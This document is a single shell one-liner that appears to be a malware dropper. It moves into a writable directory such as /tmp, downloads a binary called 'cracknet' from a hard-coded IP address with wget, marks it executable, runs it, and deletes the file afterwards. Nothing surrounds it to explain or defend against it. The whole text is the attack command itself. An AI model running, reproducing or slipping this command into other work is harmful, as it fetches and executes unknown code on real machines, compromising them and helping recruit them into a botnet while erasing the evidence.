cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.86.201/cracknet; chmod +x cracknet; ./cracknet; rm -rf cracknet
